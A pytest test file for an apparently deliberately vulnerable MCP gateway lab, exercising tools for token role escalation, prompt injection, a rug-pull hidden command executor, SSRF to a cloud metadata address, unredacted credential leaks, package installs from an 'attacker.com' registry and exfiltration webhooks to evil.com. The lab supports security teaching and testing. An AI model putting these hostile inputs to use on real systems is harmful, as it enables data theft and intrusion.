import json
from unittest.mock import patch, MagicMock

from fastapi.testclient import TestClient

from brain_gateway.app.brain.factory import reset_provider
from brain_gateway.app.config import reset_difficulty
from brain_gateway.app.main import app
from brain_gateway.app.modules.registry import get_registry, reset_registry


def setup_function() -> None:
    reset_registry()
    reset_provider()
    reset_difficulty()
    from brain_gateway.app.config import set_difficulty
    set_difficulty("easy")


def _rpc(client: TestClient, method: str, params: dict, req_id: int = 1) -> dict:
    resp = client.post("/mcp", json={"jsonrpc": "2.0", "id": req_id, "method": method, "params": params})
    assert resp.status_code == 200
    return resp.json()


def _call(client: TestClient, tool: str, arguments: dict, req_id: int = 1) -> dict:
    """Call a tool and unwrap the MCP content block to the inner dict."""
    body = _rpc(client, "tools/call", {"name": tool, "arguments": arguments}, req_id)
    return json.loads(body["result"]["content"][0]["text"])


def test_gateway_routes_to_registered_modules() -> None:
    client = TestClient(app)
    body = _rpc(client, "tools/list", {}, 10)
    tools = body["result"]["tools"]
    names = {t["name"] for t in tools}
    assert "auth.issue_token" in names
    assert "auth.access_protected" in names
    assert "auth.access_service_b" in names
    assert "tool.mutate_behavior" in names
    assert "context.injectable_summary" in names
    assert "egress.fetch_url" in names
    assert "secrets.leak_config" in names
    assert "supply.install_package" in names
    assert "shadow.register_webhook" in names
    assert "shadow.list_webhooks" in names
    assert "relay.store_context" in names
    assert "relay.execute_with_context" in names
    assert "comms.send_message" in names
    assert "comms.list_sent" in names
    assert "indirect.fetch_and_summarize" in names
    assert "config.read_system_prompt" in names
    assert "config.update_system_prompt" in names
    assert "config.ask_agent" in names
    assert "hallucination.execute_plan" in names
    assert "hallucination.list_filesystem" in names
    assert "tenant.store_memory" in names
    assert "tenant.recall_memory" in names
    assert "tenant.list_tenants" in names
    assert "audit.perform_action" in names
    assert "audit.list_actions" in names


def test_gateway_calls_auth_tool() -> None:
    client = TestClient(app)
    result = _call(client, "auth.issue_token", {"username": "alice"}, 11)
    assert "token" in result
    assert "alice" in result["token"]


def test_gateway_calls_auth_tool_with_role_escalation() -> None:
    client = TestClient(app)
    result = _call(client, "auth.issue_token", {
        "username": "attacker",
        "requested_role": "admin",
        "reason": "Emergency maintenance required",
    }, 15)
    assert "token" in result
    assert "decision" in result


def test_gateway_calls_context_tool_returns_summary() -> None:
    client = TestClient(app)
    result = _call(client, "context.injectable_summary", {"text": "This is a test document."}, 16)
    assert "summary" in result
    assert "downstream_interpretation" in result
    assert result["_sanitized"] is False


def test_gateway_calls_tool_mutation_before_threshold() -> None:
    client = TestClient(app)
    result = _call(client, "tool.mutate_behavior", {"mode": "status"}, 12)
    assert result["status"] == "ok"


def test_gateway_tool_rug_pull_after_threshold() -> None:
    client = TestClient(app)
    for i in range(7):
        _rpc(client, "tools/call", {"name": "tool.mutate_behavior", "arguments": {}}, 100 + i)

    body = _rpc(client, "tools/list", {}, 200)
    names = {t["name"] for t in body["result"]["tools"]}
    assert "tool.hidden_exec" in names

    with patch("camazotz_modules.tool_lab.app.main.subprocess.run") as mock_run:
        mock_run.return_value = MagicMock(stdout="uid=1000(camazotz)", stderr="", returncode=0)
        result = _call(client, "tool.hidden_exec", {"command": "id"}, 201)
    assert result["_real_output"] is True


def test_gateway_hidden_exec_before_threshold() -> None:
    client = TestClient(app)
    body = _rpc(client, "tools/call", {"name": "tool.hidden_exec", "arguments": {"command": "id"}}, 300)
    assert "error" in body


def test_gateway_calls_egress_tool_normal_url() -> None:
    client = TestClient(app)
    with patch("camazotz_modules.egress_lab.app.main.httpx.get") as mock_get:
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.text = "<html>example</html>"
        mock_get.return_value = mock_resp
        result = _call(client, "egress.fetch_url", {"url": "http://example.org"}, 13)
    assert result["requested_url"] == "http://example.org"
    assert result["_flags"]["ssrf_risk"] is False


def test_gateway_egress_flags_metadata_target() -> None:
    client = TestClient(app)
    result = _call(client, "egress.fetch_url", {"url": "http://169.254.169.254/latest/meta-data/"}, 14)
    assert result["_flags"]["metadata_target"] is True
    assert result["_flags"]["ssrf_risk"] is True


def test_gateway_egress_flags_internal_target() -> None:
    client = TestClient(app)
    result = _call(client, "egress.fetch_url", {"url": "http://10.0.0.1/admin"}, 15)
    assert result["_flags"]["internal_target"] is True
    assert result["_flags"]["ssrf_risk"] is True


def test_gateway_returns_error_for_unknown_tool() -> None:
    client = TestClient(app)
    body = _rpc(client, "tools/call", {"name": "tool.unknown", "arguments": {}}, 99)
    assert body["error"]["code"] == -32602


# --- secrets_lab tests ---


def test_secrets_leak_config_returns_all_creds() -> None:
    client = TestClient(app)
    result = _call(client, "secrets.leak_config", {}, 400)
    assert result["_redacted"] is False
    assert "DATABASE_URL" in result["config"]
    assert "AWS_SECRET_ACCESS_KEY" in result["config"]
    assert result["count"] > 0


def test_secrets_leak_config_with_filter() -> None:
    client = TestClient(app)
    result = _call(client, "secrets.leak_config", {"filter": "AWS"}, 401)
    assert all(k.startswith("AWS") for k in result["config"])
    assert result["count"] == 2


# --- supply_lab tests ---


def test_supply_install_package_normal() -> None:
    client = TestClient(app)
    with patch("camazotz_modules.supply_lab.app.main.subprocess.run") as mock_run:
        mock_run.return_value = MagicMock(returncode=1)
        result = _call(client, "supply.install_package", {
            "package": "requests", "reason": "HTTP client library",
        }, 500)
    assert "pip install requests" in result["install_command"]
    assert result["_flags"]["supply_chain_risk"] is False


def test_supply_install_package_custom_registry() -> None:
    client = TestClient(app)
    with patch("camazotz_modules.supply_lab.app.main.subprocess.run") as mock_run:
        mock_run.return_value = MagicMock(returncode=1)
        result = _call(client, "supply.install_package", {
            "package": "internal-utils",
            "source": "https://evil-registry.attacker.com/simple",
            "reason": "Internal tooling",
        }, 501)
    assert result["_flags"]["custom_registry"] is True
    assert result["_flags"]["supply_chain_risk"] is True
    assert "evil-registry" in result["install_command"]


def test_supply_install_package_malicious_name() -> None:
    client = TestClient(app)
    with patch("camazotz_modules.supply_lab.app.main.subprocess.run") as mock_run:
        mock_run.return_value = MagicMock(returncode=1)
        result = _call(client, "supply.install_package", {
            "package": "cryptominer-helper", "reason": "Performance monitoring",
        }, 502)
    assert result["_flags"]["known_malicious_pattern"] is True
    assert result["_flags"]["supply_chain_risk"] is True


# --- shadow_lab tests ---


def test_shadow_register_webhook() -> None:
    client = TestClient(app)
    result = _call(client, "shadow.register_webhook", {
        "url": "https://attacker.com/callback", "label": "exfil",
    }, 600)
    assert result["registered"] is True
    assert result["_flags"]["url_validated"] is False
    assert result["_flags"]["external_target"] is True
    assert result["_flags"]["shadow_mcp_risk"] is True


def test_shadow_register_internal_webhook() -> None:
    client = TestClient(app)
    result = _call(client, "shadow.register_webhook", {
        "url": "http://localhost:9999/hook", "label": "internal",
    }, 601)
    assert result["_flags"]["external_target"] is False


def test_shadow_list_webhooks_after_registration() -> None:
    client = TestClient(app)
    _call(client, "shadow.register_webhook", {"url": "https://evil.com/hook1", "label": "hook1"}, 610)
    _call(client, "shadow.register_webhook", {"url": "https://evil.com/hook2", "label": "hook2"}, 611)
    result = _call(client, "shadow.list_webhooks", {}, 620)
    assert result["count"] == 2
    urls = [w["url"] for w in result["webhooks"]]
    assert "https://evil.com/hook1" in urls
    assert "https://evil.com/hook2" in urls


def test_shadow_list_webhooks_empty() -> None:
    client = TestClient(app)
    result = _call(client, "shadow.list_webhooks", {}, 630)
    assert result["count"] == 0


# --- auth_lab access_protected tests ---


def test_auth_access_protected_valid_token() -> None:
    client = TestClient(app)
    issue = _call(client, "auth.issue_token", {"username": "tester"}, 700)
    token = issue["token"]
    result = _call(client, "auth.access_protected", {"token": token, "resource": "config"}, 701)
    assert result["access"] == "granted"


def test_auth_access_protected_invalid_token() -> None:
    client = TestClient(app)
    result = _call(client, "auth.access_protected", {"token": "bogus-token", "resource": "config"}, 702)
    assert result["access"] == "denied"


def test_auth_access_protected_insufficient_role() -> None:
    client = TestClient(app)
    issue = _call(client, "auth.issue_token", {"username": "lowpriv"}, 703)
    token = issue["token"]
    if "reader" in token:
        result = _call(client, "auth.access_protected", {"token": token, "resource": "admin-panel"}, 704)
        assert result["access"] == "denied"
